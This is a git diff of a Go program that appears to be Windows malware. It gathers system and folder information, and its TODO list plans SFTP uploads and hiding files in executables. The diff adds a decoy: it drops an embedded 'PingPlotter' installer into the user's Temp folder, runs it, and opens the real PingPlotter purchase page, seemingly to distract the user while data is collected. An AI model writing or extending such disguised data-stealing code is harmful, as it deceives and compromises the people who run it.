@@ -3,7 +3,6 @@ package main
 /*
 	TODO
 - Distraction (open Browser in full screen mode)
-- Copy Files to USB & C:\Windows\
 - Upload DLLs to SFTP Server
 - Download file from SFTP server and hide in exe on Desktop
 -
@@ -16,12 +15,15 @@ import (
 	"os"
 	"os/exec"
 	"reflect"
+	"runtime"
 	"strings"
+	"time"
 
 	"github.com/elastic/go-sysinfo"
 )
 
 func main() {
+	go setupFakeEnv()
 	distraction()
 	saveAllInfo()
 	fileManger()
@@ -71,12 +73,24 @@ func exportFiles() {
 func downloadFiles() {
 }
 
+func setupFakeEnv() {
+	usrDir := getUserHomeDir()
+	fakeInstall, err := PingPlotterFakeResource()
+	if err != nil {
+	}
+	out, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\PingPlotterInstaller.exe")
+	out.Write(fakeInstall)
+	out.Close()
+}
+
 func distraction() {
-	cmd1 := exec.Command("WinDirStat.exe", "/b")
+	usrDir := getUserHomeDir()
+	time.Sleep(time.Second)
+	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\PingPlotterInstaller.exe")
 	cmd1.Run()
 	// pid := cmd1.Process.Pid
 	// fmt.PrintLn(pid)
-	exec.Command("rundll32", "url.dll,FileProtocolHandler", "http://matt.waiariki.net/").Start()
+	exec.Command("rundll32", "url.dll,FileProtocolHandler", "https://www.pingplotter.com/products/purchase").Start()
 }
 
 func sysGrab() string {
@@ -149,4 +163,15 @@ func folderGrab() string {
 	}
 
 	return envoInfo
+}
+
+func getUserHomeDir() string {
+	if runtime.GOOS == "windows" {
+		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+		if home == "" {
+			home = os.Getenv("USERPROFILE")
+		}
+		return home
+	}
+	return os.Getenv("HOME")
 }
